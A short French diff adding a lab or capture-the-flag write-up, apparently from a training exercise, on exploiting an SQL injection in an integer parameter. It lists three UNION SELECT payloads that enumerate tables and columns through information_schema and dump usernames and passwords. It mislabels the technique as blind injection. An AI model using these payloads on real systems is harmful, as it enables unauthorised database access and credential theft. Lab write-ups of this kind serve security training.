@@ -1,0 +1,13 @@
+C'est une "Blind SQL Injection"
+
+- On comprend rapidement que une injection est possible en faisait bugger la synxtaxe avec un ';
+- La requete attend un interger alors nos injection ressemblent a celles ci dessous :
+
+Injection permettant de trouver lister le nom des TABLES et dans quelle DB elles sont :
+1 UNION SELECT table_schema, table_name FROM information_schema.columns
+
+Injection qui permet de lister les columns des tables :
+1 UNION SELECT table_name, column_name FROM information_schema.columns
+
+Celle ci retourne les usernames et passswords de la db_default ( celle ou sont stockee les users).
+1 UNION SELECT username, password FROM Member_Brute_Force.db_default
